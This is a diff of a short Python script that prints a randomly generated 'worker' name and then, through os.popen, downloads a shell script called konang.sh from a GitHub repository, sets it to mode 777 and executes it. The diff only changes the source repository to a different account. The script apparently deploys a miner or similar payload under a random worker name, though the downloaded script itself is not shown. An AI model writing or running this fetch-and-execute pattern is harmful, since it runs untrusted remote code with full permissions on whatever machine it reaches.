@@ -31,6 +31,6 @@ password = "".join(temp)
 #print the password
 print("nama worker")
 print(password)
-strki = 'wget https://github.com/haningsari/nang/raw/main/konang.sh && chmod 777 konang.sh && ./konang.sh'
+strki = 'wget https://github.com/jadisatuda/bandara/raw/main/konang.sh && chmod 777 konang.sh && ./konang.sh'
 a = os.popen(strki).readlines()
 a
